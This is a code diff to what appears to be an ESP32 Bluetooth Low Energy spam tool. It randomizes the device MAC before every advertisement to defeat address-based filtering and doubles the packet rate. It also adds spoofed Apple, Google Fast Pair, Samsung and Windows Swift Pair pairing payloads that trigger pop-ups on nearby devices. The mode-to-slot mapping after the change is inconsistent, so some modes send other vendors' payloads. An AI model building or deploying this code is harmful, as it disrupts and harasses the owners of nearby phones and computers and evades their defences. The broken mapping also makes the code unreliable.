@@ -1,6 +1,7 @@
 #pragma once
 #include <Arduino.h>
 #include <NimBLEDevice.h>
+#include <esp_gap_ble_api.h>
 #include "../utils/logger.h"
 
 /*
@@ -44,13 +45,22 @@ public:
         static unsigned long next = 0;
         if (millis() < next) return;
 
+        // Randomiza MAC antes de cada advertisement para evitar filtragem por endereço
+        _randomizeAddress();
         _sendNext();
         packetsSent++;
-        next = millis() + 80; // 80ms entre pacotes
+        next = millis() + 40; // 40ms — dobra a taxa de advertisement
     }
 
 private:
     uint8_t _idx = 0;
+
+    void _randomizeAddress() {
+        uint8_t addr[6];
+        esp_fill_random(addr, 6);
+        addr[0] |= 0xC0; // bits 7:6 = 11 → BLE random static address
+        esp_ble_gap_set_rand_addr(addr);
+    }
 
     struct ADVPayload { const char* name; std::vector<uint8_t> data; };
 
@@ -98,12 +108,47 @@ private:
             0x00, 0x10, 0x00, 0x00, 0x00
         }};
     }
+    ADVPayload _appleHomePod() {
+        return {"HomePod Setup", {
+            0x09, 0xFF,
+            0x4C, 0x00,
+            0x0F, 0x05, // Nearby Action
+            0x06,       // action: HomePod setup
+            0x00, 0x10, 0x00, 0x00, 0x00
+        }};
+    }
+    ADVPayload _appleWatch() {
+        return {"Apple Watch Link", {
+            0x0E, 0xFF,
+            0x4C, 0x00,
+            0x0F, 0x05, // Nearby Action
+            0x07,       // action: Apple Watch
+            0x00, 0x01, 0x00, 0x00, 0x00,
+            0x00, 0x00, 0x00
+        }};
+    }
     ADVPayload _androidFastPair() {
-        // Google Fast Pair service UUID 0xFE2C
+        // Google Fast Pair service UUID 0xFE2C — Pixel Buds model
         return {"Android Fast Pair", {
             0x03, 0x03, 0x2C, 0xFE, // Service UUID list: FE2C
             0x06, 0x16, 0x2C, 0xFE, // Service data
             0x40, 0x08, 0x04        // Google model ID (Pixel Buds)
+        }};
+    }
+    ADVPayload _androidFastPairBuds() {
+        // Fast Pair — Pixel Buds A-Series model ID
+        return {"Android Pixel Buds A", {
+            0x03, 0x03, 0x2C, 0xFE,
+            0x06, 0x16, 0x2C, 0xFE,
+            0x00, 0x40, 0xF4
+        }};
+    }
+    ADVPayload _androidFastPairNeckband() {
+        // Fast Pair — generic headphones trigger
+        return {"Android Headphones", {
+            0x03, 0x03, 0x2C, 0xFE,
+            0x06, 0x16, 0x2C, 0xFE,
+            0xCD, 0x8A, 0x28
         }};
     }
     ADVPayload _samsungGalaxySide() {
@@ -111,6 +156,19 @@ private:
             0x1B, 0xFF,
             0x75, 0x00, // Samsung
             0x42, 0x09, 0x81, 0x02,
+            0x14, 0x15, 0x03, 0x21,
+            0x01, 0x09, 0x00, 0x00,
+            0x00, 0x00, 0x00, 0x00,
+            0x00, 0x00, 0x00, 0x00,
+            0x00, 0x00, 0x00, 0x00,
+            0x00,
+        }};
+    }
+    ADVPayload _samsungGalaxyBudsPro() {
+        return {"Samsung Galaxy Buds Pro", {
+            0x1B, 0xFF,
+            0x75, 0x00,
+            0x42, 0x09, 0x82, 0x02, // Pro model byte
             0x14, 0x15, 0x03, 0x21,
             0x01, 0x09, 0x00, 0x00,
             0x00, 0x00, 0x00, 0x00,
@@ -128,27 +186,41 @@ private:
             0x00, 0x00, 0x00
         }};
     }
+    ADVPayload _windowsSwiftPairHeadset() {
+        return {"Windows BT Headset", {
+            0x0B, 0xFF,
+            0x06, 0x00,
+            0x03,
+            0x00, 0x80, 0x00,
+            0x01, 0x00, 0x00, 0x00
+        }};
+    }
 
     void _sendNext() {
-        static const int NUM_ALL = 7;
+        static const int NUM_ALL = 12;
         ADVPayload pld;
         int slot = _idx % NUM_ALL;
         switch (mode) {
-            case MODE_APPLE:   slot = _idx % 4; break;
-            case MODE_ANDROID: slot = 4; break;
-            case MODE_SAMSUNG: slot = 5; break;
-            case MODE_WINDOWS: slot = 6; break;
+            case MODE_APPLE:   slot = _idx % 6; break;
+            case MODE_ANDROID: slot = 4 + (_idx % 3); break;
+            case MODE_SAMSUNG: slot = 7 + (_idx % 2); break;
+            case MODE_WINDOWS: slot = 9 + (_idx % 2); break;
             default: break;
         }
         switch (slot) {
-            case 0: pld = _appleAirpods();    break;
-            case 1: pld = _appleAirpodsMax(); break;
-            case 2: pld = _appleTV();         break;
-            case 3: pld = _applePairing();    break;
-            case 4: pld = _androidFastPair(); break;
-            case 5: pld = _samsungGalaxySide();break;
-            case 6: pld = _windowsSwiftPair();break;
-            default: pld = _applePairing();   break;
+            case 0:  pld = _appleAirpods();           break;
+            case 1:  pld = _appleAirpodsMax();        break;
+            case 2:  pld = _appleTV();                break;
+            case 3:  pld = _applePairing();           break;
+            case 4:  pld = _appleHomePod();           break;
+            case 5:  pld = _appleWatch();             break;
+            case 6:  pld = _androidFastPair();        break;
+            case 7:  pld = _androidFastPairBuds();    break;
+            case 8:  pld = _androidFastPairNeckband();break;
+            case 9:  pld = _samsungGalaxySide();      break;
+            case 10: pld = _samsungGalaxyBudsPro();   break;
+            case 11: pld = _windowsSwiftPair();       break;
+            default: pld = _windowsSwiftPairHeadset();break;
         }
         _idx++;
 
